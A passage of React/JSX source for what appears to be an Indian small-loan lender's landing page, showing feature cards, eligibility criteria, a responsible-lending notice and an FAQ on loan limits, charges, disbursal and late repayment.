                  { title: 'Transparent Terms', desc: 'No hidden charges. Clear Key Facts Statement provided.', icon: CheckCircle2 },
                ].map((feature, idx) => (
                  <div key={idx} className="flex gap-4">
                    <div className="w-12 h-12 rounded-lg bg-blue-100 flex items-center justify-center text-blue-700 shrink-0">
                      <feature.icon size={24} />
                    </div>
                    <div>
                      <h3 className="text-lg font-bold text-slate-900 mb-1">{feature.title}</h3>
                      <p className="text-slate-600 text-sm leading-relaxed">{feature.desc}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            <div>
              <div className="bg-white p-8 rounded-xl border border-slate-200 shadow-sm h-full">
                <h2 className="text-2xl font-bold text-slate-900 mb-6 flex items-center gap-3">
                  <CheckCircle2 className="text-emerald-500" /> Eligibility Criteria
                </h2>
                <ul className="space-y-4 mb-8">
                  <li className="flex items-start gap-3">
                    <div className="w-6 h-6 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 shrink-0 mt-0.5 text-sm font-bold">1</div>
                    <p className="text-slate-700">Must be an Indian citizen resident in India.</p>
                  </li>
                  <li className="flex items-start gap-3">
                    <div className="w-6 h-6 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 shrink-0 mt-0.5 text-sm font-bold">2</div>
                    <p className="text-slate-700"><strong>Age:</strong> Must be 18 years or older.</p>
                  </li>
                  <li className="flex items-start gap-3">
                    <div className="w-6 h-6 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 shrink-0 mt-0.5 text-sm font-bold">3</div>
                    <p className="text-slate-700">Must have a valid PAN Card.</p>
                  </li>
                  <li className="flex items-start gap-3">
                    <div className="w-6 h-6 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 shrink-0 mt-0.5 text-sm font-bold">4</div>
                    <p className="text-slate-700">Must provide accurate information and complete all required KYC documents.</p>
                  </li>
                </ul>

                <div className="bg-blue-50 p-5 rounded-lg border border-blue-100">
                  <h3 className="font-semibold text-blue-900 mb-2">Responsible Lending</h3>
                  <p className="text-sm text-blue-800 leading-relaxed">
                    We encourage all customers to carefully review applicable loan terms, total charges, repayment obligations, and the Key Facts Statement before proceeding with any application.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* FAQs */}
      <section id="faqs" className="py-16 md:py-24 bg-white">
        <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center mb-12">
            <h2 className="text-3xl font-bold text-slate-900 mb-4">Frequently Asked Questions</h2>
            <p className="text-slate-600">Find answers about our loan process and policies.</p>
          </div>

          <div className="space-y-4">
            {[
              { q: 'What is the maximum loan amount available?', a: 'Initial loan limits range from ₹1,000 to ₹5,000. Higher limits may become available for returning customers subject to credit appraisal and applicable company policy.' },
              { q: 'Are there any hidden charges?', a: 'No. All charges, including processing fees and GST, are transparently displayed in the Loan Summary and the Key Facts Statement before you confirm the application.' },
              { q: 'How is the loan disbursed?', a: 'Upon final approval and verification, the net loan amount is disbursed directly to your provided Bank Account or UPI ID.' },
              { q: 'What happens if I delay repayment?', a: 'Late payment charges will apply as per the loan agreement. We strongly advise borrowing responsibly and ensuring you can meet repayment obligations on time.' },
            ].map((faq, idx) => (
              <div key={idx} className="bg-slate-50 border border-slate-200 rounded-lg p-6">
                <h3 className="text-lg font-bold text-slate-900 mb-2 flex items-start gap-3">
                  <HelpCircle size={20} className="text-blue-600 shrink-0 mt-1" />
                  {faq.q}
                </h3>
                <p className="text-slate-600 pl-8">{faq.a}</p>
              </div>
            ))}
          </div>
        </div>
      </section>
    </div>
  );
}
